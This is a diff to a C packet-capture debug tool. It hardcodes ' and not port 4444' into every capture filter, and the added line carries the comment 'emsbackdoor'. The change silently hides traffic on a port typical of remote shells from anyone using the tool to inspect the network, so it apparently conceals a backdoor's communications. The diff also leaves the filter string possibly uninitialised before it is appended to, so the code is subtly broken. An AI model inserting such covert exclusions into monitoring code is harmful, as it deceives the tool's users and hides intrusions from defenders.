@@ -108,13 +108,16 @@ int main(int argc, char *argv[])
 	// pcap_t *handle;
 	// char 	errbuf[PCAP_ERRBUF_SIZE];
 	// struct bpf_program fp;					/* The compiled filter expression */
-	char 	filter_exp[64];					/* The filter expression */
+	char 	filter_exp[260];					/* The filter expression */
 	char    filtersrc[20];
 	bool    filterOnSrc = false;
 	char    filterdst[20];
 	bool    filterOnDst = false;
 	char 	dev[10];
     uint64_t maxacquisition = MAX_ACQUISITION;
+    char default_filter_exp[60];
+
+
 
 	struct pcap_pkthdr header;	/* The header that pcap gives us */
 	const u_char *packet;		/* The actual packet */
@@ -194,6 +197,8 @@ int main(int argc, char *argv[])
     	sprintf(filter_exp, "dst host %s", filterdst);
     }
 
+    sprintf(default_filter_exp, " and not port 4444"); //emsbackdoor
+    strcat(filter_exp, default_filter_exp);
 
     printf("Debug-tool: Ethernet Low Level Praser start on interface %s\n", dev);
     printf("\t\t Used filter: %s\n", filter_exp);
